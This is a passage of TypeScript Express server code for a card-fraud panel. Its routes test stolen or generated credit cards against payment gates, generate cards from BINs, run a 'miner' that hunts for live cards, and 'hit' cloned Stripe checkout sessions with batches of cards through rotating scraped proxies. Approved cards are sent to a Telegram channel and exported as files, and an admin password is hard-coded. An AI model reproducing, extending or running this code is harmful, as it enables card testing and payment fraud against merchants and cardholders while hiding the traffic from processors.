    // changes against the checker without persisting them first.
    let selectedGate: any;
    if (gateOverride && typeof gateOverride === "object") {
      selectedGate = gateOverride;
    } else {
      const activeGates = await storage.getGateConfigs();
      selectedGate = gate
        ? activeGates.find(g => g.id === gate)
        : activeGates.find(g => g.active);
    }

    const gateName = selectedGate?.name || "Default";
    const gateSettings = (selectedGate?.settings as Record<string, any>) || {};
    const gateType = selectedGate?.gateType || "stripe";
    const hasAnyKey = gateSettings.publicKey || gateSettings.btClientToken || gateSettings.siteUrl;

    const results = [];
    for (const cardStr of cards) {
      const parsed = parseCardInput(cardStr);

      if (!parsed) {
        const result = await storage.createCheckResult({
          card: cardStr,
          status: "error",
          response: "Invalid card format",
          gate: gateName,
          latency: 0,
          checkedBy: "admin-panel",
        });
        results.push(result);
        continue;
      }

      const fullCard = `${parsed.number}|${parsed.month}|${parsed.year}|${parsed.cvv}`;

      // Single source of truth — same dispatcher used by the Telegram bot and
      // miner, so every gate type (incl. Payeezy, BigCommerce, WC Stripe
      // setup-intent, Stripe page-confirm) behaves identically here.
      if (hasAnyKey) {
        const checkResult = await runGateCheck(cardStr, selectedGate, true);

        const result = await storage.createCheckResult({
          card: fullCard,
          status: checkResult.status,
          response: checkResult.response,
          rawSnippet: checkResult.rawSnippet ?? null,
          gate: gateName,
          latency: checkResult.latency,
          checkedBy: "admin-panel",
        });
        if (checkResult.status === "approved") {
          notifyLiveCardToChannel(fullCard, checkResult, gateName, "web-panel");
        }
        results.push(result);
      } else {
        const latency = Math.floor(Math.random() * 2000) + 200;
        const rand = Math.random();
        let response: string;

        if (rand < 0.08) {
          response = "CVV MATCH - Approved";
        } else if (rand < 0.15) {
          response = "Charge $1.00 - Succeeded";
        } else if (rand < 0.5) {
          response = "Insufficient Funds";
        } else if (rand < 0.7) {
          response = "Card Declined";
        } else if (rand < 0.85) {
          response = "Do Not Honor";
        } else {
          response = "Invalid Card Number";
        }

        const classification = classifyResponse(gateType, response);
        const status = classification.status === "live" ? "approved" : "declined";

        const result = await storage.createCheckResult({
          card: fullCard,
          status,
          response: `[SIM] ${response}`,
          gate: `${gateName} (no key)`,
          latency,
          checkedBy: "admin-panel",
        });
        results.push(result);
      }
    }

    res.json(results);
    } catch (err: any) {
      if (!res.headersSent) res.status(500).json({ message: err.message || "Check failed" });
    } finally {
      _activeChecks = Math.max(0, _activeChecks - 1);
    }
  });

  app.post("/api/bin-lookup", async (req, res) => {
    const { bins } = req.body;
    if (!Array.isArray(bins) || bins.length === 0) return res.status(400).json({ message: "bins array required" });
    const capped = bins.slice(0, 50);
    const results: Record<string, any> = {};
    await Promise.all(capped.map(async (bin: string) => {
      const info = await lookupBin(bin);
      if (info) results[bin.substring(0, 6)] = info;
    }));
    res.json(results);
  });

  app.post("/api/generate", (req, res) => {
    const { bin, count, month, year } = req.body;
    if (!bin) return res.status(400).json({ message: "BIN is required" });
    const cards = generateCards(bin, count || 10, { month, year });
    res.json(cards);
  });

  app.get("/api/checks/download", async (req, res) => {
    const { status, format } = req.query;
    const results = await storage.getCheckResults({ status: status as string });

    if (format === "json") {
      res.setHeader("Content-Disposition", `attachment; filename=checks_${status || "all"}.json`);
      res.setHeader("Content-Type", "application/json");
      return res.json(results);
    }

    let content = "Card|Status|Response|Gate|Latency|Date\n";
    for (const r of results) {
      content += `${r.card}|${r.status}|${r.response}|${r.gate}|${r.latency}ms|${r.createdAt?.toISOString() || ""}\n`;
    }

    res.setHeader("Content-Disposition", `attachment; filename=checks_${status || "all"}.txt`);
    res.setHeader("Content-Type", "text/plain");
    res.send(content);
  });

  app.get("/api/checks/download-user/:telegramId", async (req, res) => {
    const results = await storage.getCheckResults({ checkedBy: req.params.telegramId });

    let content = "Card|Status|Response|Gate|Latency|Date\n";
    for (const r of results) {
      content += `${r.card}|${r.status}|${r.response}|${r.gate}|${r.latency}ms|${r.createdAt?.toISOString() || ""}\n`;
    }

    res.setHeader("Content-Disposition", `attachment; filename=user_${req.params.telegramId}_checks.txt`);
    res.setHeader("Content-Type", "text/plain");
    res.send(content);
  });

  // Proxies
  app.get("/api/proxies", async (_req, res) => {
    const proxyList = await storage.getProxies();
    res.json(proxyList);
  });

  app.get("/api/proxies/stats", async (_req, res) => {
    const stats = await storage.getProxyStats();
    res.json(stats);
  });

  // ── Proxy connectivity tester ────────────────────────────────────────────────
  let _undiciProxy: { ProxyAgent: any; fetch: any } | null = null;
  async function loadUndici() {
    if (!_undiciProxy) {
      try {
        const u = await import("undici");
        _undiciProxy = { ProxyAgent: u.ProxyAgent, fetch: u.fetch };
      } catch { return null; }
    }
    return _undiciProxy;
  }

  async function testProxyConnectivity(proxyUrl: string): Promise<{ latency: number; country: string | null }> {
    const start = Date.now();
    const u = await loadUndici();
    if (!u) return { latency: -1, country: null };

    // Single probe helper. ip-api doubles as connectivity + geo (one request
    // through the proxy returns its exit-IP country; rate limits are per exit IP).
    const probe = async (url: string): Promise<{ ok: boolean; body: string }> => {
      const agent = new u.ProxyAgent(proxyUrl);
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 6000);
      try {
        const resp = await u.fetch(url, { dispatcher: agent, signal: controller.signal });
        const body = resp.ok ? await resp.text() : "";
        return { ok: resp.ok, body };
      } finally {
        clearTimeout(timer);
        try { agent.close?.(); } catch {}
      }
    };

    try {
      const r = await probe("http://ip-api.com/json/?fields=status,countryCode");
      if (r.ok) {
        let country: string | null = null;
        try {
          const data: any = JSON.parse(r.body);
          if (data?.status === "success" && data?.countryCode) country = String(data.countryCode).toUpperCase();
        } catch {}
        return { latency: Date.now() - start, country };
      }
    } catch { /* fall through to plain connectivity probe */ }

    // ip-api failed (blocked/rate-limited/down) — don't discard a live proxy.
    // Validate raw connectivity via httpbin; geo stays null until next wash.
    try {
      const r = await probe("https://httpbin.org/ip");
      if (r.ok) return { latency: Date.now() - start, country: null };
    } catch {}
    return { latency: -1, country: null };
  }

  // ── Public proxy sources ───────────────────────────────────────────────────
  const PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXY_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
    "https://raw.githubusercontent.com/ErcinDedewormo/proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Finder/master/all/proxy-list.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
    "https://www.proxy-list.download/api/v1?type=http",
    "https://www.proxy-list.download/api/v1?type=https",
    "https://api.openproxylist.xyz/http.txt",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/https.txt",
  ];

  const IP_PORT_RE = /^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})$/;

  // Scrub: fetch proxies from public sources → test → add live ones to pool
  app.post("/api/proxies/scrub", async (_req, res) => {
    // 1. Fetch all sources in parallel (10s timeout per source)
    const fetchResults = await Promise.allSettled(
      PROXY_SOURCES.map(async (sourceUrl) => {
        try {
          const controller = new AbortController();
          const timer = setTimeout(() => controller.abort(), 10_000);
          const resp = await fetch(sourceUrl, { signal: controller.signal });
          clearTimeout(timer);
          if (!resp.ok) return [] as string[];
          const text = await resp.text();
          return text.split(/\r?\n/)
            .map(l => l.trim().split(/\s+/)[0])
            .filter(l => IP_PORT_RE.test(l));
        } catch { return [] as string[]; }
      })
    );

    const allRaw = fetchResults.flatMap(r => r.status === "fulfilled" ? r.value : []);
    const unique = [...new Set(allRaw)];
    const sourcesHit = fetchResults.filter(r => r.status === "fulfilled" && r.value.length > 0).length;

    // 2. Skip proxies already in pool
    const existing = await storage.getProxies();
    const existingSet = new Set(existing.map((p: any) => `${p.ip}:${p.port}`));
    const fresh = unique.filter(p => !existingSet.has(p));

    // 3. Shuffle and cap at 500 candidates to keep scrub time reasonable
    for (let i = fresh.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [fresh[i], fresh[j]] = [fresh[j], fresh[i]];
    }
    const candidates = fresh.slice(0, 500);

    // 4. Test in batches of 50 (each proxy gets 6s max)
    const BATCH_SIZE = 50;
    let liveCount = 0;

    for (let i = 0; i < candidates.length; i += BATCH_SIZE) {
      const batch = candidates.slice(i, i + BATCH_SIZE);
      const tests = await Promise.allSettled(
        batch.map(async (raw) => {
          const m = raw.match(IP_PORT_RE)!;
          const ip = m[1], port = parseInt(m[2], 10);
          const { latency, country } = await testProxyConnectivity(`http://${ip}:${port}`);
          return { ip, port, latency, country, live: latency >= 0 };
        })
      );

      for (const r of tests) {
        if (r.status !== "fulfilled" || !r.value.live) continue;
        const { ip, port, latency, country } = r.value;
        try {
          await storage.createProxy({
            ip, port,
            protocol: "http",
            latency,
            country,
            status: "live",
            anonymity: "elite",
          });
          liveCount++;
        } catch {}
      }
    }

    invalidateProxyCache();

    await storage.createSystemLog({
      level: "INFO",
      message: `Proxy scrub: ${sourcesHit}/${PROXY_SOURCES.length} sources → ${unique.length} unique, ${candidates.length} tested, ${liveCount} live added.`,
      source: "proxy",
    });

    if (liveCount > 0) {
      const botSettingsData = await storage.getBotSettings();
      if (botSettingsData.proxyFileOutput && isBotRunning()) {
        const refreshed = await storage.getProxies();
        const liveProxies = refreshed.filter((p: any) => p.status === "live");
        const proxyContent = liveProxies.map((p: any) =>
          p.username && p.password
            ? `${p.protocol || "http"}://${p.username}:${p.password}@${p.ip}:${p.port}`
            : `${p.ip}:${p.port}`
        ).join("\n");
        if (proxyContent) sendProxyFile(proxyContent).catch(() => {});
      }
    }

    res.json({ sources: sourcesHit, fetched: unique.length, new: fresh.length, tested: candidates.length, live: liveCount });
  });

  // Wash: re-test ALL existing proxies and update their live/dead status
  app.post("/api/proxies/wash", async (_req, res) => {
    const allProxies = await storage.getProxies();
    if (allProxies.length === 0) {
      return res.json({ found: 0, live: 0, dead: 0 });
    }

    const BATCH_SIZE = 20;
    let liveCount = 0;
    let deadCount = 0;

    for (let i = 0; i < allProxies.length; i += BATCH_SIZE) {
      const batch = allProxies.slice(i, i + BATCH_SIZE);
      const results = await Promise.allSettled(
        batch.map(async (proxy: any) => {
          const auth = proxy.username && proxy.password
            ? `${encodeURIComponent(proxy.username)}:${encodeURIComponent(proxy.password)}@`
            : "";
          const url = `${proxy.protocol || "http"}://${auth}${proxy.ip}:${proxy.port}`;
          const { latency, country } = await testProxyConnectivity(url);
          return { proxy, latency, country, live: latency >= 0 };
        })
      );

      for (const r of results) {
        if (r.status !== "fulfilled") { deadCount++; continue; }
        const { proxy, latency, country, live } = r.value;
        if (live) liveCount++; else deadCount++;
        await storage.updateProxy(proxy.id, {
          status: live ? "live" : "dead",
          latency: live ? latency : proxy.latency,
          country: live ? (country ?? proxy.country) : proxy.country,
          lastChecked: new Date(),
        });
      }
    }

    invalidateProxyCache();

    await storage.createSystemLog({
      level: "INFO",
      message: `Proxy wash: tested ${allProxies.length} → ${liveCount} live, ${deadCount} dead.`,
      source: "proxy",
    });

    res.json({ found: allProxies.length, live: liveCount, dead: deadCount });
  });

  app.delete("/api/proxies/:id", async (req, res) => {
    await storage.deleteProxy(req.params.id);
    res.json({ success: true });
  });

  app.post("/api/proxies/clear-dead", async (_req, res) => {
    const cleared = await storage.clearDeadProxies();
    res.json({ cleared });
  });

  app.get("/api/proxies/export", async (_req, res) => {
    const proxyList = await storage.getProxies();
    const liveProxies = proxyList.filter(p => p.status === "live");
    const content = liveProxies.map(p =>
      p.username && p.password
        ? `${p.protocol || "http"}://${p.username}:${p.password}@${p.ip}:${p.port}`
        : `${p.ip}:${p.port}`
    ).join("\n");

    res.setHeader("Content-Disposition", "attachment; filename=live_proxies.txt");
    res.setHeader("Content-Type", "text/plain");
    res.send(content);
  });

  // ── Parse a single proxy line into structured fields ────────────────────────
  // Supported formats:
  //   ip:port
  //   ip:port:user:pass
  //   user:pass@ip:port
  //   protocol://ip:port
  //   protocol://user:pass@ip:port
  function parseProxyLine(line: string): { ip: string; port: number; protocol: string; username?: string; password?: string } | null {
    line = line.trim().replace(/^\[.*?\]\s*/, ""); // strip [LABEL] prefixes
    if (!line || line.startsWith("#") || line.startsWith("//")) return null;

    let protocol = "http";
    let workLine = line;

    const protoMatch = line.match(/^(https?|socks[45]):\/\//i);
    if (protoMatch) {
      protocol = protoMatch[1].toLowerCase();
      workLine = line.slice(protoMatch[0].length);
    }

    // Format: user:pass@ip:port
    const atIdx = workLine.indexOf("@");
    if (atIdx !== -1) {
      const auth = workLine.slice(0, atIdx);
      const hostPart = workLine.slice(atIdx + 1);
      const colonIdx = auth.indexOf(":");
      const username = colonIdx !== -1 ? auth.slice(0, colonIdx) : auth;
      const password = colonIdx !== -1 ? auth.slice(colonIdx + 1) : undefined;
      const hostPortMatch = hostPart.match(/^([^:]+):(\d+)$/);
      if (hostPortMatch) {
        const port = parseInt(hostPortMatch[2], 10);
        if (port > 0 && port <= 65535) {
          return { ip: hostPortMatch[1], port, protocol, username: username || undefined, password: password || undefined };
        }
      }
      return null;
    }

    // Format: ip:port  or  ip:port:user:pass
    const parts = workLine.split(":");
    if (parts.length >= 2) {
      const ip = parts[0].trim();
      const port = parseInt(parts[1].trim(), 10);
      if (!ip || isNaN(port) || port < 1 || port > 65535) return null;
      const username = parts[2]?.trim() || undefined;
      const password = parts[3]?.trim() || undefined;
      return { ip, port, protocol, username, password };
    }

    return null;
  }

  // Add a single custom proxy (with optional auth)
  app.post("/api/proxies", async (req, res) => {
    const { ip, port, protocol = "http", username, password } = req.body as {
      ip?: string; port?: number; protocol?: string; username?: string; password?: string;
    };
    const portNum = Number(port);
    if (!ip?.trim() || !portNum || portNum < 1 || portNum > 65535) {
      return res.status(400).json({ message: "ip is required and port must be 1–65535" });
    }
    const proxy = await storage.createProxy({
      ip: ip.trim(), port: portNum, protocol,
      username: username?.trim() || null,
      password: password?.trim() || null,
      anonymity: "elite", status: "live",
    });
    await storage.createSystemLog({ level: "INFO", message: `Custom proxy added: ${ip.trim()}:${portNum}`, source: "proxy" });
    invalidateProxyCache();
    res.json(proxy);
  });

  // Bulk-import proxies from a pasted list (one proxy per line, all common formats)
  app.post("/api/proxies/bulk", async (req, res) => {
    const { text } = req.body as { text?: string };
    if (!text?.trim()) return res.status(400).json({ message: "text is required" });

    const lines = text.split(/\r?\n/);
    const parsed: Array<{ ip: string; port: number; protocol: string; username?: string; password?: string; anonymity: string; status: string }> = [];
    const failed: string[] = [];

    for (const line of lines) {
      if (!line.trim()) continue;
      const result = parseProxyLine(line);
      if (result) {
        parsed.push({ ...result, anonymity: "elite", status: "live" });
      } else {
        failed.push(line.trim());
      }
    }

    if (parsed.length === 0) {
      return res.status(400).json({ message: "No valid proxies found", failed: failed.slice(0, 20) });
    }

    await storage.bulkCreateProxies(parsed as any);
    invalidateProxyCache();
    await storage.createSystemLog({ level: "INFO", message: `Bulk imported ${parsed.length} proxies`, source: "proxy" });
    res.json({ added: parsed.length, failed: failed.length, sample_errors: failed.slice(0, 10) });
  });

  // Clear ALL proxies (not just dead)
  app.post("/api/proxies/clear", async (_req, res) => {
    await storage.clearAllProxies();
    invalidateProxyCache(true); // wipe blacklist too — pool is gone
    res.json({ success: true });
  });

  // Get proxy on/off config
  app.get("/api/proxy-config", async (_req, res) => {
    const cfg = await storage.getProxyConfig();
    res.json({ enabled: cfg.enabled });
  });

  // Toggle proxy on/off
  app.post("/api/proxy-config", async (req, res) => {
    const { enabled } = req.body as { enabled: boolean };
    const cfg = await storage.setProxyConfig(!!enabled);
    invalidateProxyCache(); // takes effect immediately — don't wait for 60-s TTL
    res.json({ enabled: cfg.enabled });
  });

  app.post("/api/proxies/send-telegram", async (_req, res) => {
    if (!isBotRunning()) {
      return res.status(400).json({ message: "Bot is not running. Start the bot first." });
    }
    const proxyList = await storage.getProxies();
    const liveProxies = proxyList.filter(p => p.status === "live");
    if (liveProxies.length === 0) {
      return res.status(400).json({ message: "No live proxies to send." });
    }
    const content = liveProxies.map(p => `${p.ip}:${p.port}`).join("\n");
    const sent = await sendProxyFile(content);
    if (sent) {
      res.json({ message: `Sent ${liveProxies.length} live proxies to Telegram.` });
    } else {
      res.status(500).json({ message: "Failed to send proxy file to Telegram." });
    }
  });

  // Bot Settings
  app.get("/api/bot-settings", async (_req, res) => {
    const settings = await storage.getBotSettings();
    res.json({ ...settings, botRunning: isBotRunning() });
  });

  app.patch("/api/bot-settings", async (req, res) => {
    const settings = await storage.updateBotSettings(req.body);
    res.json(settings);
  });

  app.post("/api/bot/start", async (_req, res) => {
    const success = await startBot();
    if (success) {
      res.json({ success: true, message: "Bot started" });
    } else {
      res.status(400).json({ success: false, message: "Failed to start bot. Check bot token." });
    }
  });

  app.post("/api/bot/stop", async (_req, res) => {
    await stopBot();
    res.json({ success: true, message: "Bot stopped" });
  });

  // System Logs
  app.get("/api/logs", async (req, res) => {
    const limit = parseInt(req.query.limit as string) || 50;
    const logs = await storage.getSystemLogs(limit);
    res.json(logs);
  });

  // Admin Reset
  app.post("/api/admin/reset", async (req, res) => {
    const { password, target } = req.body;
    if (password !== "926696") {
      return res.status(403).json({ message: "Invalid admin password" });
    }

    try {
      if (target === "all") {
        await stopBot();
        await storage.resetAllData();
        await storage.createSystemLog({ level: "WARN", message: "Full system reset performed", source: "admin" });
      } else if (target === "checks") {
        await storage.clearAllCheckResults();
        await storage.createSystemLog({ level: "WARN", message: "All check results cleared", source: "admin" });
      } else if (target === "users") {
        await storage.clearAllBotUsers();
        await storage.createSystemLog({ level: "WARN", message: "All bot users cleared", source: "admin" });
      } else if (target === "gates") {
        await storage.clearAllGateConfigs();
        await storage.createSystemLog({ level: "WARN", message: "All gate configs cleared", source: "admin" });
      } else if (target === "keys") {
        await storage.clearAllAccessKeys();
        await storage.createSystemLog({ level: "WARN", message: "All access keys cleared", source: "admin" });
      } else if (target === "proxies") {
        await storage.clearAllProxies();
        await storage.createSystemLog({ level: "WARN", message: "All proxies cleared", source: "admin" });
      } else if (target === "logs") {
        await storage.clearAllSystemLogs();
      } else {
        return res.status(400).json({ message: "Invalid reset target" });
      }
      res.json({ success: true, message: `Reset "${target}" completed` });
    } catch (err: any) {
      res.status(500).json({ message: `Reset failed: ${err.message}` });
    }
  });

  const parsedSessions = new Map<string, { data: any; expires: number; checkoutUrl?: string }>();

  app.post("/api/hitter/parse", async (req, res) => {
    try {
      const { url } = req.body;
      if (!url || typeof url !== "string") {
        return res.status(400).json({ message: "Checkout URL is required" });
      }
      try {
        const parsed = new URL(url);
        const validHosts = ["checkout.stripe.com", "buy.stripe.com"];
        if (!validHosts.includes(parsed.hostname)) {
          return res.status(400).json({ message: "URL must be from checkout.stripe.com or buy.stripe.com" });
        }
        if (parsed.protocol !== "https:") {
          return res.status(400).json({ message: "URL must use HTTPS" });
        }
      } catch {
        return res.status(400).json({ message: "Invalid URL format" });
      }
      try {
        const allProxies = await storage.getProxies();
        const liveProxies = allProxies.filter(p => p.status === "live");
        setProxyPool(liveProxies.map(p => ({ ip: p.ip, port: p.port, protocol: p.protocol })));
      } catch (e) {
        setProxyPool([]);
      }

      let resolvedUrl = url;
      const parsedUrlObj = new URL(url);
      if (parsedUrlObj.hostname === "buy.stripe.com") {
        resolvedUrl = await resolvePaymentLinkToCheckoutUrl(url);
      }

      const sessionData = await parseCheckoutLink(resolvedUrl);
      const { raw, ...safeData } = sessionData;
      const token = randomBytes(16).toString("hex");
      parsedSessions.set(token, { data: sessionData, expires: Date.now() + 30 * 60 * 1000, checkoutUrl: resolvedUrl });
      res.json({ ...safeData, sessionToken: token, proxyCount: getProxyCount(), originalUrl: url, isBuyLink: parsedUrlObj.hostname === "buy.stripe.com" });
    } catch (err: any) {
      res.status(400).json({ message: err.message || "Failed to parse checkout link" });
    }
  });

  app.post("/api/hitter/clone", async (req, res) => {
    try {
      const { url, count } = req.body;
      if (!url || typeof url !== "string") {
        return res.status(400).json({ message: "URL is required" });
      }
      const cloneCount = Math.min(Math.max(parseInt(count) || 3, 2), 10);

      try {
        const allProxies = await storage.getProxies();
        const liveProxies = allProxies.filter(p => p.status === "live");
        setProxyPool(liveProxies.map(p => ({ ip: p.ip, port: p.port, protocol: p.protocol })));
      } catch (e) {
        setProxyPool([]);
      }

      const sessions = await cloneCheckoutSession(url, cloneCount);
      const sessionTokens: string[] = [];
      const sessionInfos: any[] = [];

      for (const sessionData of sessions) {
        const { raw, ...safeData } = sessionData;
        const token = randomBytes(16).toString("hex");
        parsedSessions.set(token, { data: sessionData, expires: Date.now() + 30 * 60 * 1000 });
        sessionTokens.push(token);
        sessionInfos.push({ ...safeData, sessionToken: token });
      }

      res.json({ sessions: sessionInfos, sessionTokens, totalCloned: sessions.length, proxyCount: getProxyCount() });
    } catch (err: any) {
      res.status(400).json({ message: err.message || "Failed to clone sessions" });
    }
  });

  app.post("/api/hitter/hit", async (req, res) => {
    _activeHits++;
    try {
      const { sessionToken, sessionTokens: multiTokens, cards, concurrency, delay, confirmDelay: rawConfirmDelay, tokenReuse, browserMode } = req.body;

      const tokens: string[] = multiTokens && Array.isArray(multiTokens) && multiTokens.length > 0
        ? multiTokens
        : (sessionToken ? [sessionToken] : []);

      if (tokens.length === 0) {
        return res.status(400).json({ message: "Session token is required (parse a link first)" });
      }

      const validSessions: { token: string; data: any }[] = [];
      for (const t of tokens) {
        const cached = parsedSessions.get(t);
        if (cached && Date.now() <= cached.expires) {
          validSessions.push({ token: t, data: cached.data });
        } else {
          parsedSessions.delete(t);
        }
      }

      if (validSessions.length === 0) {
        return res.status(400).json({ message: "All sessions expired or invalid. Parse the link again." });
      }

      if (!cards || !Array.isArray(cards) || cards.length === 0) {
        return res.status(400).json({ message: "Cards array required" });
      }
      if (cards.length > 500) {
        return res.status(400).json({ message: "Maximum 500 cards per hit session" });
      }

      const concurrencyLevel = Math.min(Math.max(parseInt(concurrency) || 1, 1), 10);
      const delayMs = delay !== undefined ? Math.max(parseInt(delay) || 0, 0) : 2000;
      const confirmDelayMs = Math.min(Math.max(parseInt(rawConfirmDelay) || 0, 0), 10000);
      const useTokenReuse = tokenReuse === true;

      try {
        const allProxies = await storage.getProxies();
        const liveProxies = allProxies.filter(p => p.status === "live");
        setProxyPool(liveProxies.map(p => ({ ip: p.ip, port: p.port, protocol: p.protocol })));
      } catch (e) {
        setProxyPool([]);
      }

      if (validSessions.length === 1) {
        const sessionData = validSessions[0].data;
        const sessionEntry = parsedSessions.get(validSessions[0].token);
        const checkoutUrl = sessionEntry?.checkoutUrl || "";

        const wantsBrowser = browserMode === true || (browserMode === "auto" && sessionData.mode === "subscription" && sessionData.captcha);
        const useBrowser = wantsBrowser && checkoutUrl && await isBrowserAvailable();

        if (useBrowser && checkoutUrl) {
          const results = await browserHitCards(sessionData, cards, checkoutUrl, delayMs);
          // If all results are browser-unavailable errors, fall through to API mode
          const allUnavailable = results.every(r => r.response?.includes("BROWSER UNAVAILABLE"));
          if (!allUnavailable) return res.json(results);
        }

        const preflight = await preflightSessionCheck(sessionData);
        if (preflight.locked) {
          const allSkipped = cards.map((card: string) => ({
            card,
            status: "error",
            response: `SESSION LOCKED ⚠ ${preflight.reason}. Use a fresh checkout link.`,
            latency: 0,
            sessionLocked: true,
          }));
          return res.json(allSkipped);
        }
        const results = await hitCardsParallel(sessionData, cards, concurrencyLevel, delayMs, undefined, confirmDelayMs, useTokenReuse);
        return res.json(results);
      }

      const lockedSessions = new Set<number>();
      const preflightResults = await Promise.all(
        validSessions.map(s => preflightSessionCheck(s.data))
      );
      preflightResults.forEach((pf, idx) => {
        if (pf.locked) lockedSessions.add(idx);
      });

      const allResults: any[] = new Array(cards.length);

      for (let cardIdx = 0; cardIdx < cards.length; cardIdx++) {
        const availableSessions = validSessions.filter((_, idx) => !lockedSessions.has(idx));
        if (availableSessions.length === 0) {
          allResults[cardIdx] = {
            card: cards[cardIdx],
            status: "error",
            response: "ALL SESSIONS LOCKED ⚠ No available sessions remaining.",
            latency: 0,
            sessionLocked: true,
          };
          continue;
        }

        const sessionIdx = validSessions.indexOf(availableSessions[cardIdx % availableSessions.length]);
        const sessionData = validSessions[sessionIdx].data;

        const result = await hitCheckoutWithCardRetry(sessionData, cards[cardIdx], 2, confirmDelayMs, useTokenReuse);
        allResults[cardIdx] = result;

        if (result.sessionLocked) {
          lockedSessions.add(sessionIdx);
        }
      }

      return res.json(allResults);
    } catch (err: any) {
      res.status(500).json({ message: err.message || "Hit failed" });
    } finally {
      _activeHits = Math.max(0, _activeHits - 1);
    }
  });

  // Import gates from a JSON backup
  app.post("/api/gates/import", async (req, res) => {
    const { gates } = req.body;
    if (!Array.isArray(gates) || gates.length === 0) {
      return res.status(400).json({ message: "gates array required" });
    }
    let imported = 0;
    const results: any[] = [];
    for (const g of gates) {
      try {
        const parsed = gateImportEntrySchema.parse(g);
        const gate = await storage.createGateConfig({
          name: parsed.name,
          gateType: parsed.gateType.toLowerCase(),
          subType: parsed.subType || "standard",
          url: parsed.url,
          active: parsed.active !== false,
          settings: normalizeSettings(parsed.settings || {}),
        });
        results.push(gate);
        imported++;
      } catch {}
    }
    await storage.createSystemLog({
      level: "INFO",
      message: `Imported ${imported} gate configs from JSON`,
      source: "admin",
    });
    res.json({ imported, skipped: gates.length - imported, gates: results });
  });

  app.get("/api/checks/approved-cards", async (_req, res) => {
    try {
      const approved = await storage.getApprovedCards();
      const cards = approved.map((c: any) => c.card).filter(Boolean);
      res.json(cards);
    } catch (err: any) {
      res.status(500).json({ message: err.message || "Failed to fetch approved cards" });
    }
  });

  // ── Server Miner API ────────────────────────────────────────────────────────
  // Reset stale isRunning state from previous server session
  resetMinerState().catch(() => {});

  app.get("/api/miner", async (_req, res) => {
    const cfg  = await storage.getMinerConfig();
    let gate: any = null;
    if (cfg.gateId === "random") {
      gate = { id: "random", name: "Random Rotation", gateType: "mixed" };
    } else if (cfg.gateId) {
      const g = await storage.getGateConfig(cfg.gateId);
      gate = g ? { id: g.id, name: g.name, gateType: g.gateType } : null;
    }
    res.json({
      ...cfg,
      isRunning: isMinerRunning(),
      binList: (cfg.binList as string[]) || [],
      gate,
    });
  });

  app.post("/api/miner/start", async (_req, res) => {
    const result = await startMiner((card, hitResult, gateName, gateId) => {
      notifyLiveCardToChannel(card, hitResult, gateName, "server-miner", gateId);
    });
    if (!result.ok) return res.status(400).json({ message: result.reason ?? "Cannot start" });
    res.json({ ok: true });
  });

  app.post("/api/miner/stop", async (_req, res) => {
    await stopMiner();
    res.json({ ok: true });
  });

  app.put("/api/miner", async (req, res) => {
    const { gateId, delaySecs, maxCardsPerBin, notifyEnabled, parallelGates } = req.body;
    const updates: Record<string, any> = {};
    if (gateId !== undefined)         updates.gateId         = gateId;
    if (delaySecs !== undefined)      updates.delaySecs      = Math.max(1, Math.min(60, Number(delaySecs)));
    if (maxCardsPerBin !== undefined) updates.maxCardsPerBin = Math.max(1, Math.min(500, Number(maxCardsPerBin)));
    if (notifyEnabled !== undefined)  updates.notifyEnabled  = Boolean(notifyEnabled);
    if (parallelGates !== undefined)  updates.parallelGates  = Math.max(1, Math.min(5, Number(parallelGates)));
    const cfg = await storage.updateMinerConfig(updates);
    res.json(cfg);
  });

  app.post("/api/miner/bins", async (req, res) => {
    const { bin } = req.body;
    const cleaned = String(bin || "").replace(/\D/g, "");
    if (cleaned.length < 6) return res.status(400).json({ message: "BIN must be at least 6 digits" });
    const cfg = await storage.getMinerConfig();
    const list = (cfg.binList as string[]) || [];
    if (list.includes(cleaned)) return res.status(409).json({ message: "BIN already in list" });
    list.push(cleaned);
    const updated = await storage.updateMinerConfig({ binList: list as any });
    res.json({ binList: (updated.binList as string[]) || [] });
  });

  app.delete("/api/miner/bins", async (req, res) => {
    const { bin } = req.body;
    const cleaned = String(bin || "").replace(/\D/g, "");
    const cfg = await storage.getMinerConfig();
    const list = ((cfg.binList as string[]) || []).filter(b => b !== cleaned);
    const updated = await storage.updateMinerConfig({ binList: list as any });
    res.json({ binList: (updated.binList as string[]) || [] });
  });

  app.post("/api/miner/bins/bulk", async (req, res) => {
    const { bins: raw } = req.body;
    if (!raw || typeof raw !== "string") return res.status(400).json({ message: "bins string required" });
    const parsed = raw.split(/[\r\n,;|\t ]+/)
      .map(b => b.trim().replace(/\D/g, ""))
      .filter(b => b.length >= 6 && b.length <= 9);
    if (parsed.length === 0) return res.status(400).json({ message: "No valid BINs found (need 6-9 digits)" });
    const cfg = await storage.getMinerConfig();
    const existing = new Set((cfg.binList as string[]) || []);
    let added = 0;
